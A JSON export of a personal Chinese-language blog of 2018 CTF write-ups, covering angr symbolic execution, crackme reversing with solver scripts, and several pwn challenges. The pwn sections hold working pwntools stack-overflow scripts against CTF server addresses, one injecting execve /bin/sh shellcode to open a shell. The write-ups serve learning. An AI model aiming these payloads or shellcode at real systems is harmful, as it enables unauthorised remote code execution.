{"meta":{"title":"4eriri's blog","subtitle":null,"description":null,"author":"4eriri","url":"http://yoursite.com"},"pages":[],"posts":[{"title":"符号执行Angr","slug":"符号执行Angr","date":"2018-11-03T14:57:50.000Z","updated":"2018-11-04T06:26:08.670Z","comments":true,"path":"2018/11/03/符号执行Angr/","link":"","permalink":"http://yoursite.com/2018/11/03/符号执行Angr/","excerpt":"","text":"突然发现记录一些简单题的做题过程只会浪费时间，以后就不记录特别简单的题了（虽然难的题也不会写XD 今天在做whalectf上面的题目时，有两道类型差不多的题，但是一道用爆破解出来了，另一道)却解不出来，查找writeup的时候找不到一样的题目，但是找到了类似的题目，并且发现了符号执行这个东西，学习后掌握了新的解题技巧。 首先要安装angr库，具体操作方法可以百度。 解题脚本： 12345678import angr import claripy p = angr.Project(&quot;./ais3_crackme&quot;) argv1=claripy.BVS(&apos;argv1&apos;,24*8)state=p.factory.entry_state(args=[&apos;./ais3_crackme&apos;,argv1])simgr=p.factory.simgr(state)simgr.explore(find=0x400602,avoid=0x40060e)print simgr.found[0].solver.eval(argv1,cast_to=str) 其中： p = angr.Project(&quot;./ais3_crackme&quot;) 为每一个angr脚本必备 argv1=claripy.BVS(&#39;argv1&#39;,24*8) 是以二进制形式设一个参数，ida分析程序得知参数长度为24 state=p.factory.entry_state(args=[&#39;./ais3_crackme&#39;,argv1]) 获取程序的初始状态 simgr=p.factory.simgr(state) 遍历路径 simgr.explore(find=0x400602,avoid=0x40060e) 设定成功与失败的路径结果，地址由ida分析得 print simgr.found[0].solver.eval(argv1,cast_to=str) 以字符串形式输出结果 这一题几乎是照抄着写了一遍，因此再把之前那道简单的题)拿出来练一下手。 脚本如下： 123456import angr p = angr.Project(&quot;./r100&quot;) state=p.factory.entry_state(args=[&apos;./r100&apos;])simgr=p.factory.simgr(state)simgr.explore(find=0x400844,avoid=0x400855)print simgr.found[0].posix.dumps(0) 但还是不太熟练，可至少拥有了两个简单的模版XD 再摘录一下freebuf上的较通用脚本： 12345678910111213141516171819202122232425262728293031import angrimport sysprint &quot;[*]start------------------------------------&quot;p = angr.Project(sys.argv[1]) # 建立工程初始化二进制文件state = p.factory.entry_state() # 获取入口点处状态&apos;&apos;&apos;state.posix.files[0].read_from(1)表示从标准输入读取一个字节&apos;&apos;&apos;for _ in xrange(int(sys.argv[2])): # 对输入进行简单约束（不为回车） k = state.posix.files[0].read_from(1) state.se.add(k!=10)k = state.posix.files[0].read_from(1)state.se.add(k==10) # 回车为结束符state.posix.files[0].seek(0)state.posix.files[0].length = int(sys.argv[2])+1 # 约束输入长度（大于实际长度也可）print &quot;[*]simgr start-------------------------------&quot;sm = p.factory.simgr(state) # 初始化进程模拟器sm.explore(find=lambda s:&quot;correct!&quot; in s.posix.dumps(1)) # 寻找运行过程中存在 “correct！”的路径，并丢弃其他路径print &quot;[*]program excuted---------------------------&quot;for pp in sm.found: out = pp.posix.dumps(1) # 表示程序的输出 print out inp = pp.posix.files[0].all_bytes() # 取输入的变量 print pp.solver.eval(inp,cast_to = str) # 利用约束求解引擎求解输入","categories":[],"tags":[]},{"title":"MOCTF-1","slug":"MOCTF-1","date":"2018-10-31T13:25:57.000Z","updated":"2018-11-01T12:45:32.859Z","comments":true,"path":"2018/10/31/MOCTF-1/","link":"","permalink":"http://yoursite.com/2018/10/31/MOCTF-1/","excerpt":"","text":"SO EASY虽然程序很大，但是在main函数里直接可以看见flag。 跳跳跳还是🎲游戏，千篇一律，nop掉判断就好了。 暗恋的苦恼给了加密程序，密文，密钥，要推算出明文。 ida打开，定位到加密函数： 123456789101112v7 = strlen(a1);v6 = strlen(a2);v4 = 0;v3 = operator new(0xFFu);for ( i = 0; i &lt; v7; ++i )&#123; if ( v4 == v6 ) v4 = 0; v3[i] = sub_401005(a1[i], a2[v4++]);&#125;v3[i] = 0;return v3; 每一位密钥对每一位明文操作，当密钥用完时从头再取。sub_401005: 1234567891011v4 = toupper(a1);v5 = toupper(a2);if ( v4 == &apos; &apos; ) return v4;for ( i = 0; i &lt; v4 - 65; ++i ) ++v5;if ( v5 &gt; 90 ) result = v5 - 25;else result = v5;return result; toupper是转换为大写。v5+=v4-65，然后根据v5的值决定返回值。然而不知道 1234if ( v5 &gt; 90 ) result = v5 - 25;else result = v5; 这一部分怎么逆好，就把两种情况都写了…结合题目中有具体意义的提示应该也不失为一种方法吧23333: 1234567891011121314mingwen=&quot;&quot;miwen=&quot;QWDRILDWNTW&quot;miyao=&quot;ILOVEMOCTF&quot;for i in range(len(miwen)): v5=ord(miwen[i]) v4=65+v5-ord(miyao[i%9]) mingwen+=chr(v4)print mingwenmingwen=&quot;&quot;for i in range(len(miwen)): v5=ord(miwen[i])+25 v4=65+v5-ord(miyao[i%9]) mingwen+=chr(v4)print mingwen easy pwn栈溢出： 1234char s; // [esp+4h] [ebp-14h]gets(&amp;s);return puts(&amp;s); 后门函数： 123456789101112131415161718.text:0804850B public success.text:0804850B success proc near.text:0804850B ; __unwind &#123;.text:0804850B push ebp.text:0804850C mov ebp, esp.text:0804850E sub esp, 8.text:08048511 sub esp, 0Ch.text:08048514 push offset s ; &quot;you success gets flag&quot;.text:08048519 call _puts.text:0804851E add esp, 10h.text:08048521 sub esp, 0Ch.text:08048524 push offset command ; &quot;cat flag&quot;.text:08048529 call _system.text:0804852E add esp, 10h.text:08048531 nop.text:08048532 leave.text:08048533 retn.text:08048533 ; &#125; // starts at 804850B 脚本： 1234567from pwn import *sh=remote(&quot;139.199.177.55&quot;,10001)sh.recvuntil(&quot;easy?\\n&quot;)system=0x0804850bpayload=&apos;a&apos;*0x18+p32(0x0804850b)sh.sendline(payload)sh.interactive()","categories":[],"tags":[]},{"title":"MCTF2018-2","slug":"MCTF2018-2","date":"2018-10-30T15:15:37.000Z","updated":"2018-10-31T07:51:29.619Z","comments":true,"path":"2018/10/30/MCTF2018-2/","link":"","permalink":"http://yoursite.com/2018/10/30/MCTF2018-2/","excerpt":"","text":"identifyida打开，搜索字符串，找到了提示错误用户名和密码的字符串，并由此找到了关键函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109v17 = xmmword_402210; v18 = xmmword_402200; v2 = &quot;WELCOME TO MCTF\\n&quot;; v19 = xmmword_402220; v3 = aWelcomeToMctf[0]; v23 = 0xF5; v25 = 0; v20 = xmmword_4021F0; v21 = xmmword_402240; v22 = xmmword_402230; for ( i = 0i64; *v2; v3 = *v2 ) &#123; putchar(v3); ++v2; fflush(0); Sleep(0x64u); &#125; if ( a2 == 3 ) &#123; sub_401040(&quot;~checking:&quot;); sub_401080(); v5 = strcmp(*(const char **)(a3 + 4), &quot;Mirage&quot;); if ( v5 ) v5 = -(v5 &lt; 0) | 1; if ( v5 ) &#123; sub_401040(&quot;Incorrect username\\n&quot;); sub_401010(&quot;fail\\n&quot;); system(&quot;pause&quot;); &#125; sub_401040(&quot;\\nCorrect Username\\n&quot;); v6 = *(const char **)(a3 + 8); v7 = 0; if ( strlen(v6) ) &#123; do &#123; v9 = v7 &amp; 0x80000001; v8 = (v7 &amp; 0x80000001) == 0; if ( (v7 &amp; 0x80000001 &amp; 0x80000000) != 0 ) &#123; v10 = ((_BYTE)v9 - 1) | 0xFFFFFFFE; v8 = v10 == -1; v9 = v10 + 1; &#125; if ( v8 ) &#123; if ( (v6[v7] ^ 0x88) != *((_DWORD *)&amp;v17 + v7) ) &#123; v11 = &quot;\\nIncorrect password\\n&quot;; v12 = 10; do &#123; putchar(v12); ++v11; fflush(0); Sleep(0x64u); v12 = *v11; &#125; while ( *v11 ); sub_401010(&quot;fail\\n&quot;); goto LABEL_25; &#125; &#125; else if ( v9 == 1 &amp;&amp; (v6[v7] ^ 0x66) != *((_DWORD *)&amp;v17 + v7) ) &#123; sub_401040(&quot;\\nIncorrect password\\n&quot;); sub_401010(&quot;fail\\n&quot;); goto LABEL_25; &#125; ++v7; &#125; while ( v7 &lt; strlen(v6) ); &#125; v13 = &quot;~checking:&quot;; v14 = 126; do &#123; putchar(v14); ++v13; fflush(0); Sleep(0x64u); v14 = *v13; &#125; while ( *v13 ); sub_401080(); v15 = &quot;\\nCongratulations!\\n&quot;; v16 = 10; do &#123; putchar(v16); ++v15; fflush(0); Sleep(0x64u); v16 = *v15; &#125; while ( *v15 ); sub_401010(&quot;success\\n&quot;);LABEL_25: system(&quot;pause&quot;); result = 0; &#125; else &#123; sub_401010(&quot;[ERROR] Login information missing\\n&quot;); sub_401010(&quot;Usage: %s &lt;username&gt; &lt;password&gt;\\n&quot;, *(_DWORD *)a3); result = 1; &#125; return result; 显然用户名是Mirage，而密码就需要进行异或运算了。 密码下标为偶数的部分异或0x88后与固定字符串相等。 密码下标为奇数的部分异或0x66后与固定字符串相等。 逆运算脚本如下： 12345678key=[0xc5,0x25,0xdc,0x20,0xf3,0x3e,0xb8,0x14,0xd7,0x57,0xfb,0x39,0xf9,0x13,0xb9,0x12,0xed,0x39,0xfb,0x57,0xe5,0x16,0xe4,0x53,0xf5]flag=&quot;&quot;for i in range(len(key)): if i&amp;1 == 0: flag+=chr(key[i]^0x88) if i&amp;1 == 1: flag+=chr(key[i]^0x66)print flag 吃鲨鱼peid看了一下发现是c#，拖进dnspy： 123456789101112131415161718192021222324252627282930313233343536373839404142434445private void button1_Click(object sender, EventArgs e) &#123; string text = this.textBox1.Text; string[] array = new string[] &#123; &quot;69691c7bdcc3ce6d5d8a1361f22d04ac&quot;, &quot;0d61f8370cad1d412f80b84d143e1257&quot;, &quot;b9ece18c950afbfa6b0fdbfa4ff731d3&quot;, &quot;800618943025315f869e4e1f09471012&quot;, &quot;f95b70fdc3088560732a5ac135644506&quot;, &quot;4a8a08f09d37b73795649038408b5f33&quot;, &quot;03c7c0ace395d80182db07ae2c30f034&quot;, &quot;2510c39011c5be704182423e3a695e91&quot;, &quot;0cc175b9c0f1b6a831c399e269772661&quot;, &quot;4b43b0aee35624cd95b910189b3dc231&quot;, &quot;83878c91171338902e0fe0fb97a8c47a&quot;, &quot;b14a7b8059d9c055954c92674ce60032&quot;, &quot;6f8f57715090da2632453988d9a1501b&quot;, &quot;8277e0910d750195b448797616e091ad&quot;, &quot;e4da3b7fbbce2345d7772b0674a318d5&quot;, &quot;cbb184dd8e05c9709e5dcaedaa0495cf&quot; &#125;; if (text.Length &gt; 16) &#123; this.label2.Text = &quot;You are wrong!&quot;; return; &#125; for (int i = 0; i &lt; text.Length; i++) &#123; char[] array2 = new char[] &#123; &apos;H&apos; &#125;; array2[0] = text[i]; string str = new string(array2); if (array[i].CompareTo(Form1.fivefive(str)) != 0) &#123; this.label2.Text = &quot;You are wrong!&quot;; &#125; else &#123; this.label2.Text = &quot;You are right!&quot;; &#125; &#125; &#125; 找到了这里，并且发现程序中有一些地方出现了md5，把定义的array的每个字符串md5解密一下得到了flag。 Math for kids","categories":[],"tags":[]},{"title":"MCTF2018-1","slug":"MCTF2018-1","date":"2018-10-27T05:18:44.000Z","updated":"2018-10-30T15:15:21.837Z","comments":true,"path":"2018/10/27/MCTF2018-1/","link":"","permalink":"http://yoursite.com/2018/10/27/MCTF2018-1/","excerpt":"","text":"hello helloida打开： 123456789101112131415161718192021222324252627282930mov [rbp+s2], 4Dh ; &apos;M&apos;mov [rbp+var_5F], 43h ; &apos;C&apos;mov [rbp+var_5E], 54h ; &apos;T&apos;mov [rbp+var_5D], 46h ; &apos;F&apos;mov [rbp+var_5C], 7Bh ; &apos;&#123;&apos;mov [rbp+var_5B], 77h ; &apos;w&apos;mov [rbp+var_5A], 65h ; &apos;e&apos;mov [rbp+var_59], 31h ; &apos;1&apos;mov [rbp+var_58], 63h ; &apos;c&apos;mov [rbp+var_57], 6Fh ; &apos;o&apos;mov [rbp+var_56], 6Dh ; &apos;m&apos;mov [rbp+var_55], 65h ; &apos;e&apos;mov [rbp+var_54], 5Fh ; &apos;_&apos;mov [rbp+var_53], 32h ; &apos;2&apos;mov [rbp+var_52], 6Fh ; &apos;o&apos;mov [rbp+var_51], 5Fh ; &apos;_&apos;mov [rbp+var_50], 52h ; &apos;R&apos;mov [rbp+var_4F], 65h ; &apos;e&apos;mov [rbp+var_4E], 76h ; &apos;v&apos;mov [rbp+var_4D], 65h ; &apos;e&apos;mov [rbp+var_4C], 72h ; &apos;r&apos;mov [rbp+var_4B], 73h ; &apos;s&apos;mov [rbp+var_4A], 65h ; &apos;e&apos;mov [rbp+var_49], 5Fh ; &apos;_&apos;mov [rbp+var_48], 57h ; &apos;W&apos;mov [rbp+var_47], 6Fh ; &apos;o&apos;mov [rbp+var_46], 72h ; &apos;r&apos;mov [rbp+var_45], 31h ; &apos;1&apos;mov [rbp+var_44], 64h ; &apos;d&apos;mov [rbp+var_43], 7Dh ; &apos;&#125;&apos; drink coffeeluyten打开，check函数： 123456789101112131415161718192021222324public static boolean CHECK(final int input) &#123; if (input &gt; 10000000 &amp;&amp; input &lt; 99999999) &#123; int v7 = 1; int v8 = 10000000; int v9 = 1; if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0) &#123; for (int v10 = 0; v10 &lt; 4; ++v10) &#123; if (input / v7 % 10 != input / v8 % 10) &#123; v9 = 0; break; &#125; v7 *= 10; v8 /= 10; &#125; if (v9 != 1) &#123; return false; &#125; if (v9 == 1) &#123; return true; &#125; &#125; &#125; return false; &#125; 本来想用这几天在研究的z3求解的…可是前面两题到现在也没能解出来…这一题运行z3脚本一直卡住，没有任何提示orz。只好不用z3，魔改了原代码求passwd： 12345678910111213for i in range(10000000,99999999): v7 = 1 v8 = 10000000 v9 = 1 if (abs(i / 1000 % 100 - 80) == 3 and i % 1000 % 927 == 0): for j in range(4): if (i / v7 % 10 != i / v8 % 10): v9 = 0 break v7 *= 10 v8 /= 10 if (v9 == 1): print i 运行后打印出passwd，输入后得到flag。 听说你是萌新一张jpg，hexfiend打开在文件末尾得到flag。 不如…一张png，binwalk看一下： 1234DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 1332 x 747, 8-bit/color RGBA, non-interlaced830060 0xCAA6C End of Zip archive 发现是zip结尾，搜索IEND找到png的结尾，然后把后面的zip全部copy下来保存为新文件。mac直接可以解压，但是解压出来的docx啥也看不见，开虚拟机用windows看了一下发现有密码，所以应该就是伪加密了，找到第二个PK后标记有无密码的位置，把01改为00，解压后查看docx得到flag。 猜猜flag走后门吗有后门函数直接可以开shell，直接栈溢出覆盖返回地址： 1234567from pwn import *sh=remote(&quot;123.206.131.120&quot;,10001)backdoor_add=0x4006e0sh.recv()payload=&quot;a&quot;*0x58+p64(backdoor_add)sh.sendline(payload)sh.interactive() 后门？不存在的和上面一题基本差不多，不过没有后门函数了。同样的栈溢出，没开nx保护，同时会打印出存放输入的内存地址，找了个shellcode： 123456789from pwn import *sh=remote(&quot;123.206.131.120&quot;,10002)sh.recvuntil(&quot;is&quot;)sh.recv(3)add=int(sh.recv(12),16)shellcode=&quot;\\x48\\x31\\xd2\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7\\x50\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05&quot;payload=shellcode+&apos;\\x90&apos;*(0x58-len(shellcode))+p64(add)sh.sendline(payload)sh.interactive() 做出了后门也不给你走","categories":[],"tags":[]},{"title":"sus-gccc","slug":"sus-gccc","date":"2018-10-25T13:51:39.000Z","updated":"2018-10-26T15:10:08.132Z","comments":true,"path":"2018/10/25/sus-gccc/","link":"","permalink":"http://yoursite.com/2018/10/25/sus-gccc/","excerpt":"","text":".net程序，dnspy反编译一波： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// Token: 0x02000002 RID: 2public class GrayCCC&#123; // Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458 public static void Main() &#123; Console.Write(&quot;Input the key: &quot;); uint num; if (!uint.TryParse(Console.ReadLine().Trim(), out num)) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; string text = &quot;&quot;; string text2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125; &quot;; int num2 = 0; byte[] array = new byte[] &#123; 164, 25, 4, 130, 126, 158, 91, 199, 173, 252, 239, 143, 150, 251, 126, 39, 104, 104, 146, 208, 249, 9, 219, 208, 101, 182, 62, 92, 6, 27, 5, 46 &#125;; byte b = 0; while (num != 0u) &#123; char c = (char)(array[num2] ^ (byte)num ^ b); if (!text2.Contains(new string(c, 1))) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; text += c; b ^= array[num2++]; num &gt;&gt;= 1; &#125; if (text.Substring(0, 5) != &quot;FLAG&#123;&quot; || text.Substring(31, 1) != &quot;&#125;&quot;) &#123; Console.WriteLine(&quot;Invalid key&quot;); return; &#125; Console.WriteLine(&quot;Your flag is: &quot; + text); &#125;&#125; 定义了uint类型变量num，text[i]=array[i]^(num&amp;0xff)^b，不过b=0可以忽略不计，最后要求text的前五位为FLAG{，最后一位为}，并且每一位都是大写字母，题目推荐使用z3求解。","categories":[],"tags":[]},{"title":"实验吧-3","slug":"实验吧-3","date":"2018-10-24T10:40:16.000Z","updated":"2018-10-26T15:10:49.205Z","comments":true,"path":"2018/10/24/实验吧-3/","link":"","permalink":"http://yoursite.com/2018/10/24/实验吧-3/","excerpt":"","text":"逆向观察直接拖ida里打开，主函数： 12345678910111213141516171819202122232425 v10 = __readfsqword(0x28u); if ( argc &lt;= 1 ) &#123; puts(&quot;usage ./rev50 password&quot;); &#125; else &#123; src = &apos;sedecrem&apos;; v6 = 0; v7 = 0; v8 = 0; memcpy(&amp;dest, &amp;src, 9uLL); for ( i = 0; i &lt;= 999; ++i ) &#123; if ( !strcmp(argv[1], (&amp;dict)[i]) &amp;&amp; !strcmp(&amp;dest, (&amp;dict)[i]) ) &#123; puts(&quot;Good password ! &quot;); goto LABEL_10; &#125; &#125; puts(&quot;Bad ! password&quot;); &#125;LABEL_10: puts(&amp;byte_40252A); return 0; Good password的判断条件就是输入=src，需要注意的是这里的字符串是应该倒过来看的，所以应该是mercedes。 bitwise下载下来一个rar，解压后可以得到一个java程序和一个py程序，看上去应该功能是一样的，不会java所以就分析py吧： 1234567891011121314151617181920212223#!/usr/bin/env pythonuser_submitted = raw_input(&quot;Enter Password: &quot;)if len(user_submitted) != 10: print &quot;Wrong&quot; exit()verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]user_arr = []for char in user_submitted: # &apos;&lt;&lt;&apos; is left bit shift # &apos;&gt;&gt;&apos; is right bit shift # &apos;|&apos; is bit-wise or # &apos;^&apos; is bit-wise xor # &apos;&amp;&apos; is bit-wise and user_arr.append( (((ord(char) &lt;&lt; 5) | (ord(char) &gt;&gt; 3)) ^ 111) &amp; 255 )if (user_arr == verify_arr): print &quot;Success&quot;else: print &quot;Wrong&quot; 爆破一发： 12345678import stringflag=&quot;&quot;verify_arr = [193, 35, 9, 33, 1, 9, 3, 33, 9, 225]for i in range(len(verify_arr)): for j in string.printable: if (((ord(j) &lt;&lt; 5) | (ord(j) &gt;&gt; 3)) ^ 111) &amp; 255 == verify_arr[i] : flag+=jprint flag Byte Code下载得到一个.class文件，用jd-gui试试,结果会报错INTERNAL ERROR，百度了一下,用luyten试试打开了： 12345678910111213141516171819202122232425import java.io.*;class Authenticator&#123; public static char[] key; public static void main(final String[] array) &#123; (Authenticator.key = new char[10])[0] = &apos;A&apos;; Authenticator.key[1] = &apos;o&apos;; Authenticator.key[2] = &apos;J&apos;; Authenticator.key[3] = &apos;k&apos;; Authenticator.key[4] = &apos;V&apos;; Authenticator.key[5] = &apos;h&apos;; Authenticator.key[6] = &apos;L&apos;; Authenticator.key[7] = &apos;w&apos;; Authenticator.key[8] = &apos;U&apos;; Authenticator.key[9] = &apos;R&apos;; final Console console = System.console(); for (String line = &quot;&quot;; !line.equals(&quot;ThisIsth3mag1calString4458&quot;); line = console.readLine(&quot;Enter password:&quot;, new Object[0])) &#123;&#125; for (int i = 0; i &lt; Authenticator.key.length; ++i) &#123; System.out.print(Authenticator.key[i]); &#125; System.out.println(&quot;&quot;); &#125;&#125; 虽然不会java但是这么简单的代码还是可以看看的，AoJkVhLwUR就是输入正确时得到的flag。（luyten真给力啊 CFG to C汇编代码和c代码配对就行了，不过其实根据逻辑图就能判断。 对应 1234567int loop(int a) &#123; while (a &gt;= 0) &#123; a--; &#125; return a; &#125; 对应 12345678int control(int a, int b) &#123; if (a &gt; b) return b; else return a; &#125; 对应 12345678int for_loop(int a, int b, int c) &#123; int i; for(i = 0; i &lt; b; i++) a = c + i; return a; &#125; 对应 1234int modulo(int a, int b) &#123; return b % a; &#125; catalyst-systemida打开，main函数中关键部分： 1234567891011121314151617181920printf(&quot;Username: &quot;);__isoc99_scanf(&quot;%s&quot;, v8);printf(&quot;Password: &quot;, v8);__isoc99_scanf(&quot;%s&quot;, v7);printf(&quot;Logging in&quot;, v7);fflush(stdout);for ( j = 0; j &lt;= 29; ++j )&#123; v5 = rand(); sleep(v5 % (j + 1)); putchar(&apos;.&apos;); fflush(stdout);&#125;putchar(10);sub_400C9A((__int64)v8);sub_400CDD(v8);sub_4008F7((__int64)v8);sub_400977(v8, v7);sub_400876((__int64)v8, (__int64)v7);return 0LL; 输入账号密码后接下来几个函数进行账号密码验证与输出flag。 sub_400876就是输出flag的函数： 1234567char *s; // [rsp+0h] [rbp-30h]int i; // [rsp+1Ch] [rbp-14h]printf(&quot;your flag is: ALEXCTF&#123;&quot;, a2, a1);for ( i = 0; i &lt; strlen(s); ++i ) putchar((unsigned __int8)byte_6020A0[i] ^ s[i]);return puts(&quot;&#125;&quot;); 可以看见flag的格式了，不过不知道s处的字符串是啥，只能看看上面的函数。 sub_400c9a限制了账号的长度大于8小于16且为4的倍数，所以长度就是12. sub_400cdd函数： 1234567891011v4 = *a1;v3 = a1[1];v2 = a1[2];if ( v4 - v3 + v2 != 0x5C664B56 || v3 + 3 * (v2 + v4) != 0x2E700C7B2LL || (result = 0x32AC30689A6AD314LL, v2 * v3 != 0x32AC30689A6AD314LL) )&#123; puts(&quot;invalid username or password&quot;); exit(0);&#125;return result; 对账号进行了限制，给了三个条件表达式，这里可以使用z3求解： 12","categories":[],"tags":[]},{"title":"实验吧-2","slug":"实验吧-2","date":"2018-10-23T09:14:59.000Z","updated":"2018-10-26T16:11:24.609Z","comments":true,"path":"2018/10/23/实验吧-2/","link":"","permalink":"http://yoursite.com/2018/10/23/实验吧-2/","excerpt":"","text":"有一个程序加密得到如下密文又是pyc文件，反编译之后： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889# 2018.10.23 17:05:34 CST# Embedded file name: ./rev200.pyimport sysfrom hashlib import md5import base64from time import timefrom datetime import datetimeUC_KEY = &apos;123456789&apos;def authcode(string, operation = &apos;DECODE&apos;, key = UC_KEY, expiry = 0): ckey_length = 4 if key == &apos;&apos;: key = md5(UC_KEY.encode(&apos;utf-8&apos;)).hexdigest() else: key = md5(key.encode(&apos;utf-8&apos;)).hexdigest() keya = md5(key[0:16].encode(&apos;utf-8&apos;)).hexdigest() keyb = md5(key[16:32].encode(&apos;utf-8&apos;)).hexdigest() if ckey_length == 0: keyc = &apos;&apos; elif operation == &apos;DECODE&apos;: keyc = string[0:ckey_length] elif operation == &apos;ENCODE&apos;: keyc = md5(str(datetime.now().microsecond).encode(&apos;utf-8&apos;)).hexdigest()[-ckey_length:] else: return cryptkey = keya + md5((keya + keyc).encode(&apos;utf-8&apos;)).hexdigest() key_length = len(cryptkey) if operation == &apos;DECODE&apos;: string = base64.b64decode(string[ckey_length:]) elif operation == &apos;ENCODE&apos;: if expiry == 0: string = &apos;0000000000&apos; + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string else: string = &apos;%10d&apos; % (expiry + int(time())) + md5((string + keyb).encode(&apos;utf-8&apos;)).hexdigest()[0:16] + string else: return string_length = len(string) result = &apos;&apos; box = range(256) rndkey = [0] * 256 for i in range(256): rndkey[i] = ord(cryptkey[i % key_length]) j = 0 for i in range(256): j = (j + box[i] + rndkey[i]) % 256 tmp = box[i] box[i] = box[j] box[j] = tmp a = j = 0 for i in range(string_length): a = (a + 1) % 256 j = (j + box[a]) % 256 tmp = box[a] box[a] = box[j] box[j] = tmp result += chr(ord(string[i]) ^ box[(box[a] + box[j]) % 256]) if operation == &apos;DECODE&apos;: if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0: if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]: return result[26:] else: return &apos;&apos; else: return &apos;&apos; else: return keyc + base64.b64encode(result)if __name__ == &apos;__main__&apos;: if len(sys.argv) &lt; 3: exit(1) ex = 20 for i in range(1, len(sys.argv), 2): a = sys.argv[i] b = sys.argv[i + 1] if a == &apos;-t&apos;: ex = int(b) elif a == &apos;-e&apos;: encoded = authcode(b, &apos;ENCODE&apos;, expiry=ex) print encoded elif a == &apos;-d&apos;: decoded = authcode(b, &apos;DECODE&apos;, expiry=ex) print decoded# okay decompyling reverse300.pyc # decompiled 1 files: 1 okay, 0 failed, 0 verify failed# 2018.10.23 17:05:34 CST 要求是输入至少3个参数，第一个输入-d的话就是解密，第二个参数就输入题目给的字符串就行了，不知道第三个参数该输入啥，直接把if len(sys.argv) &lt; 3: exit(1)给nop掉了。 运行发现程序没有结果，可能是解密函数出了一些问题： 12345678910if operation == &apos;DECODE&apos;: if not result[0:10].isdigit() or int(result[0:10]) == 0 or int(result[0:10]) - int(time()) &gt; 0: if result[10:26] == md5(result[26:].encode(&apos;utf-8&apos;) + keyb).hexdigest()[0:16]: return result[26:] else: return &apos;&apos; else: return &apos;&apos;else: return keyc + base64.b64encode(result) 最里面的return result[26:]可能就是正确结果，把所有return替换成这个之后运行得到flag。 Keylead（ASIS CTF 2015）下载下来是个7z文件，后缀改为7z解压后用ida打开，从主函数发现是一个掷🎲小游戏，和上一篇里的🎲要求掷的数字也是一样的，不过这个要用gdb调试，无奈gdb鶸，只能用ida看看输出flag的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197 v11 = 0; v7 = 0; while ( v11 != 1 ) &#123; putchar(byte_601680[14 * v11++]); do &#123; while ( v7 &lt;= 1 ) putchar(byte_601680[20 * v11 - 8 * v7++]); v1 = v7 + 1; v2 = 3 * v11; putchar(byte_601680[2 * v2 + 11 + v1]); v2 *= 5; v8 = v1 - 1; putchar(byte_601680[2 * v2 + v8]); v12 = v2 / 3; while ( 1 ) &#123; while ( 1 ) &#123;LABEL_12: if ( !v8 ) &#123; putchar(byte_601680[2 * v12]); v15 = v12 ^ 2; while ( 2 ) &#123; for ( i = 1; i &lt;= 9; ++i ) putchar(byte_601680[10 * (i % 2) + 3 + v15]); v13 = v15 + 1;LABEL_44: putchar(byte_601680[v13 / 3]); if ( i == 10 ) &#123; v13 += 2 * v13 + 13; i = 19; goto LABEL_33; &#125; if ( i == 2 ) &#123; i = v13-- + 2; goto LABEL_4; &#125; if ( (unsigned int)(i - 22) &lt;= 0xA ) &#123; v14 = v13 - 3; for ( j = i - v14; ; j = 8 ) &#123;LABEL_58: putchar(byte_601680[v14 + 1]); v16 = v14 + 1; if ( j == 11 ) &#123; v13 = (v16 + 14) / 2; i = 11 * (v13 / 6); goto LABEL_44; &#125; if ( j != 13 ) break; v12 = v16 + 8; v8 = 2;LABEL_51: while ( 2 ) &#123; putchar(byte_601680[v12 - 10]); if ( v8 == v12 ) &#123; v4 = v8 + 2; v5 = v12 + 2; putchar(byte_601680[v5 / 2 + v4 / 5]); i = v4 / 2; putchar(byte_601680[i / 5 + v5]); v13 = v5 + i - 1 + v5; while ( 1 ) &#123;LABEL_33: putchar(byte_601680[v13 - 19]); if ( i == 2 ) &#123; v3 = v13 + 1; putchar(byte_601680[v3 / 2 - 3]); v13 = v3 / 5 + 2; i = 2; goto LABEL_44; &#125; if ( i &lt;= 2 ) break; if ( i == 10 ) &#123; v12 = v13 - 31; v8 = 9; goto LABEL_51; &#125; if ( i != 19 ) goto LABEL_44; i = 2; &#125; if ( i == 1 ) &#123; v8 = 17; v12 = v13 % 5 - 17 + v13;LABEL_20: putchar(byte_601680[v12 - v8 + 9]); v12 += ~v8++; continue; &#125; goto LABEL_44; &#125; break; &#125; if ( v8 != 9 ) &#123; if ( v8 != 2 ) goto LABEL_12; j = 2; v16 = v12 - 18;LABEL_64: v6 = 9 * j; putchar(byte_601680[v16 / 2 + v6 + v6 % 10]); v11 = v16 + 1; v7 = v6 % 10; goto LABEL_21; &#125; putchar(byte_601680[v12 - 16]); v14 = v12 / 2; &#125; if ( j == 8 ) &#123; v15 = v16 + 1; i = 7; continue; &#125; goto LABEL_64; &#125; goto LABEL_4; &#125; &#125; if ( v8 == 2 ) break; if ( v12 == 7 ) &#123; putchar(byte_601680[21 - v8]); v13 = 49; i = v8 / 3; goto LABEL_33; &#125; if ( v8 != 3 ) goto LABEL_20; putchar(byte_601680[2 * (v12 / 3)]); v13 = v12 / 3; i = 9; do &#123; while ( 1 ) &#123; if ( v13 == 10 ) &#123; putchar(byte_601680[i + 8]); v14 = 9; j = i + 1; goto LABEL_58; &#125; if ( v13 == 11 ) &#123; putchar(byte_601680[i / 7]); v13 = 